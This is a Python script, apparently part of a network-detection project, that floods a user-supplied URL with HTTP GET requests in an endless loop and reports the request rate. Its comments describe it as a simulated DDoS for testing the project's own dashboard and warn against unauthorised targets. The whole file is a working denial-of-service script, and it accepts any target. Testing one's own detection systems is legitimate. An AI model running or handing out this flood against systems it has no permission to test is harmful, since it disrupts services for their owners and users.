#!/usr/bin/env python3
"""
Simple HTTP Flood Attack for Testing

This script repeatedly sends HTTP GET requests to a target,
simulating a simple DDoS attack to test the detection system.

WARNING: Only use this against systems you own or have permission to test!
"""

import requests
import time

print("=" * 70)
print("🔴 HTTP FLOOD ATTACK - TESTING TOOL")
print("=" * 70)
print()
print("⚠️  WARNING: Only attack systems you own!")
print("   Unauthorized attacks are illegal.")
print()

target = input("Enter target URL (e.g., http://localhost or http://192.168.1.100): ")

if not target:
    print("❌ No target specified!")
    exit(1)

print()
print(f"Target: {target}")
print("Attack type: HTTP GET flood")
print("Press Ctrl+C to stop")
print()
print("Starting attack in 3 seconds...")
time.sleep(1)
print("3...")
time.sleep(1)
print("2...")
time.sleep(1)
print("1...")
print()
print("🚨 ATTACK STARTED!")
print()

request_count = 0
start_time = time.time()

try:
    while True:
        try:
            r = requests.get(target, timeout=5)
            request_count += 1
            
            # Show progress every 10 requests
            if request_count % 10 == 0:
                elapsed = time.time() - start_time
                rate = request_count / elapsed
                print(f"[{request_count:4d}] Status: {r.status_code} | Rate: {rate:.1f} req/s")
            
        except requests.exceptions.RequestException as e:
            print(f"[{request_count:4d}] Error: {e}")
            time.sleep(0.1)  # Brief pause on error
            
except KeyboardInterrupt:
    print()
    print()
    print("=" * 70)
    print("⚠️  Attack stopped by user")
    print("=" * 70)
    elapsed = time.time() - start_time
    print(f"Duration: {elapsed:.1f} seconds")
    print(f"Total requests: {request_count}")
    print(f"Average rate: {request_count/elapsed:.1f} requests/second")
    print()
    print("📊 Check your dashboard for detections:")
    print("   - Live Network Feed")
    print("   - Statistics cards")
    print("   - Active Blocks section")
    print("=" * 70)
